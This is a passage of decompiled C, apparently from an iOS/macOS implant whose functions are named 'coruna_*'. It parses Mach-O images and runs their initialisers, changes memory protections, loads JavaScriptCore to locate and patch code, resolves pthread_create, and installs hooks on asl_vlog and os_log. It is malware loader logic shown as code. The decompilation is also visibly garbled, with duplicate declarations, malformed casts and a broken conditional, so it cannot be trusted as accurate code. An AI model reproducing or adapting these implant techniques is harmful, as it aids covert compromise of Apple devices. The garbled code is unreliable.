       (off = *addr_2, *(int *)(off + 0x10) != 0)) {
      u = 0;
      handle = addr_2[10];
      addr = addr_2[0xb];
      err = (int *)(addr_2[0xd] + 0x20);
      do {
        if (*err == 0x19) {
          status = err + 0x12;
          flags = status + (unsigned long)(uint)err[0x10] * 0x14;
          if (status < flags) {
            do {
              if (((char)status[0x10] == '\n') && ((int)(*(unsigned long *)(status + 10) >> 3) != 0)) {
                base = *(long *)(status + 8);
                off = (*(unsigned long *)(status + 10) >> 3 & 0xffffffff) << 3;
                do {
                  ptr = *(void (**)((addr - handle) + base + -8 + off);
                  if (ptr < (void (*)addr_2[0xb] ||
                      (void (*)addr_2[0xb] + *(uint *)(addr_2 + 0x15) <= ptr) {
                    return &k_implant_rodata_word_12009;
                  }
                  err = coruna_return_zero();
                  if (err != 0) {
                    ptr = (void (*)coruna_pacia(ptr,0);
                  }
                  (*ptr)();
                  off = off + -8;
                } while (off != 0);
              }
              status = status + 0x14;
            } while (status < flags);
            off = *addr_2;
          }
        }
        err = (int *)((long)err + (unsigned long)(uint)err[1]);
        u = u + 1;
      } while (u < *(uint *)(off + 0x10));
    }
    if (addr_2[0xf] != 0) {
      (*(void (*)addr_2[0x13])(0,addr_2[0xb]);
    }
    ptr = (uint8_t *)0x1400b;
    err = coruna_driver_copy_port_1918(handle,addr_2[0xb],(int)addr_2[0x15],3);
    coruna_copy_bytes_cc70(addr_2,0x120);
    coruna_implant_via_driver_copy_port_1918(handle,addr_2,0x120);
    return ptr;
  }
done:
  ptr = (uint8_t *)0x0;
fail:
  coruna_copy_bytes_cc70(addr_2,0x120);
  coruna_implant_via_driver_copy_port_1918(handle,addr_2,0x120);
  return ptr;
}





void coruna_dyld_cached_port_ptr(long handle,long addr_2,unsigned long arg)
{
  uint64_t scratch;
  
  for (scratch = 0; scratch < arg; scratch = scratch + 1) {
    *(uint8_t *)(handle + scratch) = *(uint8_t *)(addr_2 + scratch);
  }
  return;
}





long coruna_implant_residual_40(long handle,long addr_2,long off_3,unsigned long arg)
{
  bool err;
  char err;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t thread_attr;
  
  bootargs = 0;
  do {
    if (addr_2 - arg <= bootargs) {
      err = '\x02';
fail:
      if (err != '\x01') {
        thread_attr = 0;
      }
      return thread_attr;
    }
    err = true;
    for (scratch = 0; scratch < arg; scratch = scratch + 4) {
      if (*(int *)(handle + bootargs + scratch) != *(int *)(off_3 + scratch)) {
        err = false;
        break;
      }
    }
    if (err) {
      thread_attr = handle + bootargs;
      err = '\x01';
      if (err != '\x01') {
      thread_attr = 0;
      }
      return thread_attr;
    }
    bootargs = bootargs + 4;
  } while( true );
}





void coruna_copy_bytes_cc70(long handle,unsigned long arg)
{
  uint64_t scratch;
  
  for (scratch = 0; scratch < arg; scratch = scratch + 1) {
    *(uint8_t *)(handle + scratch) = 1;
  }
  for (scratch = 0; scratch < arg; scratch = scratch + 1) {
    *(uint8_t *)(handle + scratch) = 0;
  }
  return;
}





uint32_t coruna_implant_residual_41(char *path,char *str_2)
{
  char err;
  char *scratch;
  char *bootargs;
  
  scratch = str_2;
  bootargs = path;
  do {
    err = *scratch;
    if (*bootargs != err) {
      return 1;
    }
    scratch = scratch + 1;
    bootargs = bootargs + 1;
  } while (err != '\0');
  return 0;
}





uint32_t coruna_return_zero_cd74(long handle,long addr_2,unsigned long arg)
{
  unsigned long scratch;
  
  scratch = 0;
  while( true ) {
    if (arg <= scratch) {
      return 0;
    }
    if (*(char *)(addr_2 + scratch) != *(char *)(handle + scratch)) break;
    if (*(char *)(addr_2 + scratch) == '\0') {
      return 0;
    }
    scratch = scratch + 1;
  }
  return 1;
}





int coruna_implant_residual_42(int flags)
{
  int err;
  int status;
  
  status = flags;
  if (0xe < flags) {
    status = 0xf;
  }
  err = 0;
  if (7 < flags) {
    err = ((flags - status) + 7U >> 3) + 1;
  }
  return err;
}





int coruna_nop_stub(int flags,int count_2)
{
  return flags * count_2;
}





void coruna_driver_dispatch(uint32_t size,uint32_t *flags_2,uint64_t val,uint64_t *id_2)
{
  if ((flags_2 != (uint32_t *)0x0) && (id_2 != (uint64_t *)0x0)) {
    *flags_2 = size;
    *id_2 = val;
  }
  return;
}





unsigned long coruna_implant_via_copy_bytes_cc70(int arg,long val,uint64_t n,uint64_t m)

{
  bool status;
  byte *ptr;
  uint type_id;
  byte flags;
  unsigned long port;
  byte *buf;
  uint type_id_11;
  unsigned long kind;
  unsigned long type_id_12;
  byte *str;
  byte *copy;
  unsigned long type_id_9;
  unsigned long type_id_10;
  long off;
  uint32_t type_id_13;
  unsigned long type_id_14;
  long base;
  unsigned long cache_34;
  uint cache_35;
  byte *cache_36;
  uint cache_33;
  uint *str;
  
  if (arg == 1) {
    copy = (byte *)(*(long *)(val + 0x68) +
                      (unsigned long)*(uint *)(*(long *)(val + 0x20) + 0x20));
    str = (uint *)(*(long *)(val + 0x20) + 0x24);
  }
  else {
    if (arg != 0) {
      return 0x910008;
    }
    copy = (byte *)(*(long *)(val + 0x68) +
                      (unsigned long)*(uint *)(*(long *)(val + 0x20) + 0x10));
    str = (uint *)(*(long *)(val + 0x20) + 0x14);
  }
  port = (unsigned long)*str;
  if (*str != 0) {
    type_id_10 = 0;
    off = 0;
    cache_35 = 0;
    type_id_14 = 0;
    cache_34 = 0;
    cache_36 = (byte *)0x0;
    base = 0;
    ptr = copy + port;
    cache_33 = 1;
    do {
      while( true ) {
        str = copy + 1;
        flags = *copy;
        type_id = flags & 0xf;
        port = (unsigned long)type_id;
        type_id_11 = (uint)(flags >> 4);
        copy = str;
        if (type_id_11 == 0xd) break;
        if (type_id_11 - 1 < 0xc) {
          type_id_13 = (uint32_t)type_id_14;
          switch(type_id_11) {
          default:
            type_id_14 = port;
            break;
          }
        }
load_ok_18:
        if (ptr <= copy) {
          if (off != 0) {
            coruna_implant_via_driver_copy_port_1918(m,off,(type_id_10 & 0xffffffff) << 3);
          }
          goto load_ok_19;
        }
      }
      if ((flags & 0xf) != 0) {
        if (type_id != 1) {
          return 0x91000d;
        }
        if (off == 0) {
          return 0x910018;
        }
        port = coruna_return_zero_e2dc(val,base,off,type_id_10);
        if ((int)port != 0) {
          return port;
        }
        goto load_ok_18;
      }
      type_id_9 = 0;
      buf = str;
      do {
        if (ptr <= buf) {
          type_id_9 = 0;
          copy = str;
          goto joined_r0x0000cf90;
        }
        copy = buf + 1;
        flags = *buf;
        kind = ((unsigned long)flags & 0x7f) << (port & 0x3f);
        if (0x3f < (uint)port) {
          kind = 0;
        }
        type_id_9 = kind | type_id_9;
        port = (unsigned long)((uint)port + 7);
        buf = copy;
      } while ((char)flags < '\0');
      if (type_id_9 >> 0x10 != 0) {
        return 0x91000f;
      }
joined_r0x0000cf90:
      if (off != 0) {
        coruna_implant_via_driver_copy_port_1918(m,off,(type_id_10 & 0xffffffff) << 3);
        type_id_10 = 0;
      }
      if (type_id_9 != 0) {
        off = coruna_implant_via_driver_copy_port_1918_2(m,type_id_9 << 3,0);
        if (off == 0) {
          return 0xad009;
        }
        coruna_copy_bytes_cc70(off,type_id_9 << 3);
        type_id_10 = type_id_9;
        base = off;
        goto load_ok_18;
      }
      off = 0;
      base = 0;
    } while (copy < ptr);
load_ok_19:
    port = 0;
  }
  return port;
}





int coruna_load_javascriptcore(long handle,uint64_t *val)
{
  int *err;
  uint8_t *ptr;
  uint u;
  int err;
  bool err;
  int status;
  long handle;
  int *status;
  int *flags;
  void (*ptr)(void);
  unsigned long size;
  int *count;
  long addr;
  uint64_t version;
  uint port;
  long off;
  long base;
  int scratch;
  uint64_t bootargs[2];
  void (*thread_attr)(void);
  uint64_t host_info;
  
  if (handle == 0) {
    return 0xad001;
  }
  if (val == (uint64_t *)0x0) {
    return 0xad001;
  }
  if (*(char *)((long)val + 0x5c7) == '\0') {
    return 0;
  }
  off = val[0xbb];
  if (off == 0) {
    return 0xad001;
  }
  if (val[0xba] == 0) {
    return 0xad001;
  }
  u = *(uint *)(handle + 0xa8);
  base = *(long *)(handle + 0x58);
  handle = (*(void (*)*val)("/System/Library/Frameworks/JavaScriptCore.framework/JavaScriptCore",1
                             );
  if (handle == 0) {
    return 0x1200b;
  }
  status = (int *)(*(void (*)val[1])(handle,"JSEvaluateScript");
  (*(void (*)val[3])(handle);
  version = k_implant_rodata_word_26a20;
  if (status == (int *)0x0) {
    return 0x12001;
  }
  handle = 0;
  status = 0;
  base = base - off;
  scratch = 0x15003;
  thread_attr = k_implant_rodata_word_26a30;
  host_info = coruna_u64_pack((host_info), (k_implant_rodata_word_26a38));
  err = status + 0x300000;
  do {
    if (status != (int *)0x0 && status < err) {
      flags = status;
      while (flags = (int *)coruna_implant_residual_40(flags,(long)err - (long)flags,
                                          (long)&thread_attr + handle * 4,4), flags != (int *)0x0) {
        bootargs[0] = version;
        off = coruna_implant_residual_40(flags,0x1000,bootargs,8);
        if (off != 0) {
          if (handle == 0) {
            handle = (*(void (*)*val)("/usr/lib/system/libsystem_c.dylib",1);
            if (handle == 0) {
              return 0x1200b;
            }
            ptr = (void (*)(*(void (*)val[1])(handle,"sigaction");
            (*(void (*)val[3])(handle);
            if (ptr == (void (*)0x0) {
              return 0x12001;
            }
            handle = coruna_mmap(0,0x8000,3,&k_implant_mmap_anon_fd,0,0);
            if (handle == -1) {
              return 0x15001;
            }
            status = *(int *)(val + 0x1c);
            if (((status == -0x789a1216) || (status == -0x25cc27c3)) || (status == 0x2876f5b5)) {
              version = 0xb;
              err = true;
            }
            else {
              status = coruna_mprotect(handle + 0x4000,0x4000,0);
              if (status != 0) {
                scratch = 0x15002;
                coruna_munmap(handle,0x8000);
                return scratch;
              }
              err = false;
              version = 10;
            }
            coruna_copy_bytes_cc70(&thread_attr,0x10);
            thread_attr = coruna_objc_nsobject_pair;
            host_info = k_implant_rodata_word_26a28;
            status = (*ptr)(version,&thread_attr,bootargs);
            coruna_munmap(handle,0x8000);
            return scratch;
          }
          size = 0;
          count = flags;
          do {
            if (count[-1] == -0x2efebc01) {
              if (*count == -0x56fda80a) {
                if ((flags[2] & 0xffc001e0U) == 0xb90001e0) {
                  port = (uint)flags[2] >> 8 & 0x3ffc;
                  status = 3;
check_ok:
                  if (u == 0) {
                    return 0;
                  }
                  size = 0;
                  handle = val[0xba];
                  do {
                    err = *(int *)(val[0xbb] + base + size);
                    status = (int *)(handle + base + size);
                    if (err != *status) {
                      if (status - 1U < 4) {
                        switch(status) {
                        default:
                          coruna_implant_indirect_call0(off,err);
                          break;
                        }
                      }
                      handle = val[0xba];
                      if (err != *(int *)(handle + base + size)) {
                        return 0x15005;
                      }
                    }
                    size = size + 4;
                    if (u <= size) {
                      return 0;
                    }
                  } while( true );
                }
                break;
              }
              if (*count == -0x56fea008) {
                if ((flags[2] & 0xffc001e0U) == 0xb90001e0) {
                  port = (uint)flags[2] >> 8 & 0x3ffc;
                  status = 2;
                  goto check_ok;
                }
                break;
              }
            }
            else if (count[-1] == -0x2efefc01) {
              if (*count == -0x56fea80a) {
                port = 0;
                status = 1;
                goto check_ok;
              }
              if (*count == -0x56fdb00c) {
                if ((flags[2] & 0xffc001e0U) == 0xb90001e0) {
                  port = (uint)flags[2] >> 8 & 0x3ffc;
                  status = 4;
                  goto check_ok;
                }
                break;
              }
            }
            size = size + 4;
            count = count + -1;
          } while (size < 0xed);
        }
        flags = flags + 1;
        if ((err <= flags) || (flags == (int *)0x0)) break;
      }
      status = 0x15004;
    }
    handle = handle + 1;
    if (handle == 3) {
      if (status != 0) {
        return status;
      }
      return 0x15006;
    }
  } while( true );
cleanup:
  do {
    status = *(int *)(val[0xbb] + base + size);
    if (status != *(int *)(off + base + size)) {
      coruna_driver_dispatch(status,addr + base + size,ptr,handle);
      off = val[0xba];
      if (status != *(int *)(off + base + size)) {
        scratch = 0x15005;
        status = (*ptr)(version,bootargs,0);
        if (status != 0) {
        scratch = 0x15003;
        }
      }
    }
    size = size + 4;
  } while (size < u);
done:
  scratch = 0;
skip:
  status = (*ptr)(version,bootargs,0);
  if (status != 0) {
    scratch = 0x15003;
  }
fail:
  coruna_munmap(handle,0x8000);
  return scratch;
}





void coruna_implant_via_driver_copy_port_1918(long handle,uint64_t val,unsigned long arg)
{
  long handle;
  
  if (*(char *)(handle + 0x5c5) != '\0') {
    handle = 0;
    if ((arg & 0x3fff) != 0) {
      handle = 0x4000 - (arg & 0x3fff);
    }
    coruna_driver_copy_port_1918(handle,val,handle + arg,*(uint32_t *)(handle + 0x5c8));
    return;
  }
  if (*(void (**)(handle + 0xb0) != (void (*)0x0) {
    (**(void (**)(handle + 0xb0))();
    return;
  }
  return;
}





unsigned long coruna_implant_via_driver_copy_port_1918_2(long arg,unsigned long val,unsigned long n)

{
  long ctx_val;
  int status;
  unsigned long type_id;
  unsigned long version;
  
  version = val;
  if ((*(char *)(arg + 0x5c2) == '\0') &&
     (((n & 1) != 0 || (*(char *)(arg + 0x5c5) != '\0')))) {
    version = val + 0x4000;
  }
  while (type_id = (**(void (**)(arg + 0x28))(arg,version), type_id == 0) {
    if ((*(void (**)(arg + 0x128) == (void (*)0x0) ||
       (status = (**(void (**)(arg + 0x128))(arg,version), status != 0)) {
      return -(n & 1);
    }
  }
  if (*(char *)(arg + 0x5c2) != '\0') {
    return type_id;
  }
  if ((((n & 1) != 0) || (*(char *)(arg + 0x5c5) != '\0')) && ((type_id & 0x3fff) != 0)) {
    type_id = type_id + 0x4000 & 0xffffffffffffc000;
  }
  if (*(char *)(arg + 0x5c5) == '\0') {
    return type_id;
  }
  ctx_val = 0;
  if ((val & 0x3fff) != 0) {
    ctx_val = 0x4000 - (val & 0x3fff);
  }
  status = coruna_driver_copy_port_1918(arg,type_id,ctx_val + val,3);
  if (status == 0) {
    return type_id;
  }
  return -(n & 1);
}





uint64_t coruna_driver_copy_port_1918(long handle,uint64_t val,uint64_t id_2,uint64_t size_3)
{
  uint64_t u;
  
  if (*(char *)(handle + 0x5c5) == '\0') {
    if ((((*(char *)(handle + 0x5c1) == '\0') || (*(char *)(handle + 0x5c4) != '\0')) ||
        (*(char *)(handle + 0x5c7) != '\0')) || (((uint)size_3 >> 2 & 1) != 0)) {
      return 0;
    }
    size_3 = 3;
  }
  u = coruna_mprotect(val,id_2,size_3);
  return u;
}





uint64_t coruna_find_mod_init_func(long *handle,unsigned long arg,long *addr_2)
{
  long handle;
  long addr;
  int err;
  uint64_t u;
  unsigned long size;
  uint version;
  int *err;
  
  u = 0xad001;
  if ((handle != (long *)0x0) && (addr_2 != (long *)0x0)) {
    if (*(int *)(*handle + 0x10) != 0) {
      version = 0;
      handle = handle[10];
      addr = handle[0xb];
      err = (int *)(handle[0xd] + 0x20);
      do {
        if ((((*err == 0x19) && (*(long *)(err + 0xc) != 0)) &&
            (err = coruna_return_zero_cd74(err + 2,"__PAGEZERO",0xb), err != 0)) &&
           ((*(unsigned long *)(err + 10) <= arg &&
            (size = arg - *(unsigned long *)(err + 10), size < *(unsigned long *)(err + 0xc))))) {
          *addr_2 = (addr - handle) + size + *(long *)(err + 6);
          return 0;
        }
        err = (int *)((long)err + (unsigned long)(uint)err[1]);
        version = version + 1;
      } while (version < *(uint *)(*handle + 0x10));
    }
    u = 0xad011;
  }
  return u;
}





uint64_t
uint64_t coruna_resolve_libcache_sym(int64_t arg,int64_t arg,uint64_t *val,uint64_t *id_2,uint size)
{
  uint u;
  uint size;
  bool err;
  int err;
  long handle;
  uint64_t version;
  uint port;
  uint64_t scratch;
  
  if (((((arg != 0) && (arg != 0)) && (val != (uint64_t *)0x0)) &&
      ((id_2 != (uint64_t *)0x0 && (size != 0)))) && (size != 0xfffffffe)) {
    if (size == 0xffffffff) {
      handle = -5;
    }
    else if ((((int)size < 1) || (*(uint *)(arg + 0x200) < size)) ||
            handle = (*(void (*)*val)("/usr/lib/system/libcache.dylib",0x12);
            if (handle != 0) {
            err = coruna_resolve_pthread_create(handle,arg,val,&scratch);
            (*(void (*)val[3])(handle);
            *id_2 = scratch;
            return 0;
            }
            u = *(uint *)(arg + 0x204);
            size = *(uint *)(arg + 0x200);
            port = u;
            if (size <= u) {
            port = 0;
            }
            if (port < size) {
            err = u < size;
            do {
            handle = *(long *)(arg + (unsigned long)port * 8);
            if ((handle != 0) && (err = coruna_resolve_pthread_create(handle,arg,val,&scratch), err == 0)) {
            *(uint *)(arg + 0x204) = port;
            *id_2 = scratch;
            return 0;
            }
            if (err) {
            port = (uint)(port == 0);
            *(uint32_t *)(arg + 0x204) = 0;
            }
            else {
            port = port + 1;
            }
            err = false;
            } while (port < *(uint *)(arg + 0x200));
            }
            err = coruna_implant_residual_41(arg,"dyld_stub_binder");
            if (err == 0) {
            scratch = 0xdeadbeef;
            }
            else {
            err = coruna_implant_residual_41(arg,"__objc_empty_vtable");
            if ((err != 0) && (err = coruna_implant_residual_41(arg,"_objc_readClassPair"), err != 0)) {
            return 0x910006;
            }
            scratch = 0;
            }
            *id_2 = scratch;
            return 0;
  }
fail:
  handle = (*(void (*)*val)("/usr/lib/system/libcache.dylib",0x12);
  if (handle != 0) {
    err = coruna_resolve_pthread_create(handle,arg,val,&scratch);
    (*(void (*)val[3])(handle);
    *id_2 = scratch;
    return 0;
  }
  u = *(uint *)(arg + 0x204);
  size = *(uint *)(arg + 0x200);
  port = u;
  if (size <= u) {
    port = 0;
  }
  if (port < size) {
    err = u < size;
    do {
      handle = *(long *)(arg + (unsigned long)port * 8);
      if ((handle != 0) && (err = coruna_resolve_pthread_create(handle,arg,val,&scratch), err == 0)) {
        *(uint *)(arg + 0x204) = port;
        *id_2 = scratch;
        return 0;
      }
      if (err) {
        port = (uint)(port == 0);
        *(uint32_t *)(arg + 0x204) = 0;
      }
      else {
        port = port + 1;
      }
      err = false;
    } while (port < *(uint *)(arg + 0x200));
  }
  err = coruna_implant_residual_41(arg,"dyld_stub_binder");
  if (err == 0) {
    scratch = 0xdeadbeef;
  }
  else {
    err = coruna_implant_residual_41(arg,"__objc_empty_vtable");
    if ((err != 0) && (err = coruna_implant_residual_41(arg,"_objc_readClassPair"), err != 0)) {
      return 0x910006;
    }
    scratch = 0;
  }
done:
  *id_2 = scratch;
  return 0;
}





uint64_t coruna_resolve_pthread_create(uint64_t val,char *path,uint64_t *id_2,long *handle)
{
  int err;
  long handle;
  long addr;
  long off;
  
  (*(void (*)id_2[4])();
  if ((*(char *)(id_2 + 0xb8) == '\0') ||
     (err = coruna_implant_residual_41(path,"_pthread_create"), err != 0)) {
    if (*path == '_') {
      path = path + 1;
    }
    handle = (*(void (*)id_2[1])(val,path);
    (*(void (*)id_2[4])();
    *handle = handle;
    if (handle != 0) {
      return 0;
    }
  }
  else {
    handle = k_implant_rodata_word_2c050;
    off = k_implant_rodata_word_2c058;
    addr = k_implant_rodata_word_2c788;
    if (((k_implant_rodata_word_2c050 != 0 && k_implant_rodata_word_2c058 != 0) && k_implant_rodata_word_2c788 != 0) ||
       ((((handle = (*(void (*)*id_2)("/usr/lib/system/libsystem_pthread.dylib",0x10), handle != 0
          && (handle = (*(void (*)id_2[1])(handle,"pthread_create"), handle != 0)) &&
         (addr = (*(void (*)*id_2)("/usr/lib/system/libsystem_c.dylib",0x10), addr != 0)) &&
        ((off = (*(void (*)id_2[1])(addr,"malloc"), off != 0 &&
         (addr = (*(void (*)id_2[1])(addr,"free"), addr != 0)))))) {
      k_implant_rodata_word_2c788 = addr;
      k_implant_rodata_word_2c058 = off;
      k_implant_rodata_word_2c050 = handle;
      *handle = (long)coruna_implant_via_copy_bytes_cc70_2;
      return 0;
    }
    *handle = 0;
  }
  return 0x910006;
}





uint64_t coruna_implant_via_copy_bytes_cc70_2(uint64_t val,uint64_t id_2,uint64_t size_3,uint64_t off_4)
{
  void (*ptr)(void);
  void (*buf)(void);
  uint64_t *ptr;
  uint64_t u;
  
  buf = k_implant_rodata_word_2c788;
  ptr = k_implant_rodata_word_2c050;
  if ((k_implant_rodata_word_2c050 == (void (*)0x0 || k_implant_rodata_word_2c058 == (void (*)0x0) || k_implant_rodata_word_2c788 == (void (*)0x0) {
    u = 0x16;
  }
  else {
    ptr = (uint64_t *)(*k_implant_rodata_word_2c058)(0x10);
    if (ptr == (uint64_t *)0x0) {
      u = 0xc;
    }
    else {
      *ptr = size_3;
      ptr[1] = off_4;
      u = (*ptr)(val,id_2,coruna_implant_via_copy_bytes_cc70_3,ptr);
      if ((int)u != 0) {
        coruna_copy_bytes_cc70(ptr,0x10);
        (*buf)(ptr);
      }
    }
  }
  return u;
}





uint64_t coruna_implant_via_copy_bytes_cc70_3(long *handle)
{
  void (*ptr)(void);
  uint64_t u;
  
  ptr = k_implant_rodata_word_2c788;
  if ((handle == (long *)0x0) || (*handle == 0)) {
    u = 0;
  }
  else {
    UnkSytemRegWrite(3,4,0xf,2,7,0);
    InstructionSynchronizationBarrier();
    u = (*(void (*)*handle)(handle[1]);
    coruna_copy_bytes_cc70(handle,0x10);
    if (ptr != (void (*)0x0) {
      (*ptr)(handle);
    }
  }
  return u;
}





uint64_t
uint64_t coruna_return_zero_e120(int64_t arg,int64_t arg,uint64_t val,int64_t val,int flags,uint size)
{
  unsigned long u;
  short ls2;
  uint64_t size;
  unsigned long version;
  unsigned long port;
  uint64_t tag;
  unsigned long scratch;
  unsigned long bootargs;
  long thread_attr;
  
  size = 0xad001;
  if ((arg != 0) && (arg != 0)) {
    scratch = 0;
    size = coruna_find_mod_init_func(arg,*(long *)(arg + 8) + (unsigned long)size +
                                 (unsigned long)((uint)*(ushort *)(arg + 4) * flags),&scratch);
    if ((int)size == 0) {
      tag = 0x920006;
      ls2 = *(short *)(arg + 6);
      if ((ls2 == 6) || (ls2 == 2)) {
        size = 0xad001;
        if ((scratch != 0) &&
           ((size = tag, *(unsigned long *)(arg + 0x58) <= scratch &&
            (port = scratch,
            scratch < *(unsigned long *)(arg + 0x58) + (unsigned long)*(uint *)(arg + 0xa8))))) {
          do {
            thread_attr = 0;
            coruna_dyld_cached_port_ptr(&bootargs,port,8);
            if ((long)bootargs < 0) {
              if ((uint)val <= ((uint)bootargs & 0xffffff)) {
                return 0x920001;
              }
              thread_attr = *(long *)(val + (bootargs & 0xffffff) * 8) + (bootargs >> 0x18 & 0xff);
            }
            else {
              u = bootargs & 0xfffffffff | (bootargs >> 0x24) << 0x38;
              if (ls2 == 2) {
                thread_attr = (u + *(long *)(arg + 0x60)) - *(long *)(arg + 0x50);
              }
              else {
                thread_attr = u + *(long *)(arg + 0x60);
              }
            }
            coruna_dyld_cached_port_ptr(port,&thread_attr,8);
            if ((bootargs >> 0x33 & 0xfff) == 0) {
              return 0;
            }
            port = port + (((uint)(bootargs >> 0x33) & 0xfff) << 2);
            version = *(unsigned long *)(arg + 0x58);
            u = version + *(uint *)(arg + 0xa8);
          } while ((port >= version && port <= u) && (port < version || u != port));
        }
      }
      else if (ls2 == 1) {
        size = coruna_return_zero_e2dc(arg,scratch,val,val);
      }
      else {
        size = 0x920005;
      }
    }
  }
  return size;
}





uint64_t coruna_return_zero_e2dc(long handle,unsigned long *arg,long addr_2,uint size)
{
  unsigned long *ptr;
  unsigned long u;
  long handle;
  unsigned long size;
  
  do {
    size = *arg;
    handle = *(long *)(handle + 0x60);
    ptr = arg;
    if (handle != *(long *)(handle + 0x58)) {
      ptr = (unsigned long *)((long)arg + (handle - *(long *)(handle + 0x58)));
    }
    if ((long)size < 0) {
      if ((size >> 0x3e & 1) == 0) {
        handle = handle + (size & 0xffffffff);
      }
      else {
        if (size <= ((uint)size & 0xffff)) {
          return 0x920001;
        }
        handle = *(long *)(addr_2 + (size & 0xffff) * 8);
        u = 0;
        if (handle == 0) goto fail;
      }
      u = size >> 0x20 & 0xffff;
      if ((size & 0x1000000000000) != 0) {
        u = (unsigned long)ptr & 0xffffffffffff | (size >> 0x20) << 0x30;
      }
      u = coruna_identity_8110(handle,size >> 0x31 & 3,u);
    }
    else if ((size >> 0x3e & 1) == 0) {
      u = ((size & 0x7f80000000000) * 0x2000 + handle +
              ((long)(size << 0x15) >> 0x15 & 0xffffffffffffffU)) - *(long *)(handle + 0x50);
    }
    else {
      if (size <= ((uint)size & 0xffff)) {
        return 0x920001;
      }
      u = size >> 0x20 & 0x7ffff;
      if ((size & 0x40000) != 0) {
        u = size >> 0x20 | 0xfffffffffffc0000;
      }
      u = *(long *)(addr_2 + (size & 0xffff) * 8) + u;
    }
fail:
    *arg = u;
    if ((size >> 0x33 & 0x7ff) == 0) {
      return 0;
    }
    arg = arg + ((uint)(size >> 0x33) & 0x7ff);
  } while( true );
}





long coruna_implant_residual_43(int flags,long *handle)
{
  int err;
  int status;
  int *err;
  
  err = *(int *)(*handle + 0x10);
  if (err != 0) {
    status = 0;
    err = (int *)(handle[0xd] + 0x20);
    do {
      if (*err == 0x19) {
        if (status == flags) {
          return (handle[0xb] - handle[10]) + *(long *)(err + 6);
        }
        status = status + 1;
      }
      err = (int *)((long)err + (unsigned long)(uint)err[1]);
      err = err + -1;
    } while (err != 0);
  }
  return 0;
}





uint64_t
uint64_t coruna_implant_via_resolve_libcache_sym(int64_t *arg,int64_t arg,uint size,int flags,int64_t val,uint64_t val, uint64_t id_2,int64_t n,uint32_t size_x)
{
  int err;
  uint64_t u;
  long scratch;
  long bootargs;
  
  bootargs = 0;
  if (arg == 0) {
    u = 0x91000c;
  }
  else {
    u = coruna_resolve_libcache_sym(arg,val,id_2,&bootargs,size_x);
    if ((int)u == 0x910006 && (size & 1) != 0) {
      val = 0;
      bootargs = 0;
    }
    else if ((int)u != 0) {
      return u;
    }
    err = coruna_resolve_asl_oslog(arg,id_2,&scratch);
    if (err == 0) {
      val = 0;
      bootargs = scratch;
    }
    if ((*(byte *)(n + 0xac) >> 6 & 1) == 0) {
      if (arg < *(long **)(n + 0x58)) {
        return 0x910007;
      }
      if ((long *)((long)*(long **)(n + 0x58) + (unsigned long)*(uint *)(n + 0xa8)) <= arg)
      {
        return 0x910007;
      }
    }
    if (flags == 3) {
      bootargs = (((int)val + (int)bootargs) - (int)arg) + -4;
    }
    else {
      if (flags != 2) {
        if (flags == 1) {
          *arg = val + bootargs;
          return 0;
        }
        return 0;
      }
      bootargs = (int)val + (int)bootargs;
    }
    u = 0;
    *(int *)arg = (int)bootargs;
  }
  return u;
}





uint64_t coruna_resolve_asl_oslog(uint64_t val,uint64_t *id_2,uint64_t *size_3)
{
  bool err;
  long handle;
  int err;
  long addr;
  long off;
  long base;
  long ctx_val;
  long serial;
  long serial_7;
  long serial_8;
  long serial_9;
  unsigned long u;
  unsigned long size;
  uint version;
  unsigned long port;
  void (*ptr)(void);
  uint64_t tag;
  int *err;
  unsigned long kind;
  uint8_t scratch[8];
  long bootargs;
  
  err = coruna_implant_residual_41(val,"_asl_vlog");
  ptr = coruna_asl_vlog_hook;
  if (err != 0) {
    err = coruna_implant_residual_41(val,"_asl_log");
    ptr = coruna_asl_log_hook;
    if (err != 0) {
      return 0x91000b;
    }
  }
  if (((((k_implant_rodata_word_2c060 == 0 || k_implant_rodata_word_2c068 == 0) || k_implant_rodata_word_2c070 == 0) || k_implant_rodata_word_2c078 == 0) ||
      k_implant_rodata_word_2c790 == 0) || k_implant_rodata_word_2c798 == 0) {
    tag = 0x91000b;
    addr = (*(void (*)*id_2)("/usr/lib/system/libsystem_trace.dylib",0x10);
    if (addr != 0) {
      off = (*(void (*)id_2[1])(addr,"_os_log_actual");
      if ((((off != 0) && (off = (*(void (*)id_2[1])(addr,"_os_log_internal"), off != 0))
          && (base = (*(void (*)id_2[1])(addr,"_os_log_default"), base != 0)) &&
         (ctx_val = (*(void (*)*id_2)("/usr/lib/system/libsystem_c.dylib",0x10), ctx_val != 0)) {
        serial = (*(void (*)id_2[1])(ctx_val,"vasprintf");
        if (((serial != 0) &&
            (serial_7 = (*(void (*)id_2[1])(ctx_val,"_NSGetMachExecuteHeader"), serial_7 != 0)) &&
           ((serial_8 = (*(void (*)id_2[1])(ctx_val,"free"), serial_8 != 0 &&
            ((err = (*(void (*)id_2[2])(off,scratch), err != 0 &&
             (*(int *)(bootargs + 0x10) != 0)))))) {
          version = 0;
          err = (int *)(bootargs + 0x20);
          do {
            if (((*err == 0x19) && (err = coruna_implant_residual_41(err + 2,"__TEXT"), err == 0)) &&
               (err[0x10] != 0)) {
              port = 0;
              serial_9 = *(long *)(err + 6);
              do {
                err = coruna_implant_residual_41(err + port * 0x14 + 0x12,"__oslogstring");
                if (err == 0) {
                  u = *(unsigned long *)(err + port * 0x14 + 0x1c);
                  if (u != 0) {
                    size = 0;
                    kind = 1;
                    do {
                      handle = (bootargs - serial_9) + *(long *)(err + port * 0x14 + 0x1a) +
                              size;
                      err = coruna_return_zero_cd74(handle,"%{public}s",u - size);
                      if (err == 0) {
                        if (bootargs != 0) {
                          tag = 0;
                          k_implant_rodata_word_2c060 = off;
                          k_implant_rodata_word_2c068 = base;
                          k_implant_rodata_word_2c070 = serial;
                          k_implant_rodata_word_2c078 = serial_7;
                          k_implant_rodata_word_2c790 = serial_8;
                          k_implant_rodata_word_2c798 = handle;
                          *size_3 = ptr;
                        }
                        goto fail;
                      }
                      u = *(unsigned long *)(err + port * 0x14 + 0x1c);
                      err = kind < u;
                      size = kind;
                      kind = (unsigned long)((int)kind + 1);
                    } while (err);
                  }
                }
                port = port + 1;
              } while (port < (uint)err[0x10]);
            }
            err = (int *)((long)err + (unsigned long)(uint)err[1]);
            version = version + 1;
          } while (version < *(uint *)(bootargs + 0x10));
        }
fail:
        (*(void (*)id_2[3])(ctx_val);
      }
      (*(void (*)id_2[3])(addr);
    }
  }
  else {
    tag = 0;
    *size_3 = ptr;
  }
  return tag;
}





uint64_t
uint64_t coruna_asl_vlog_hook(uint64_t val,uint64_t id_2,uint64_t size_3,uint64_t off_4, uint64_t off_5)
{
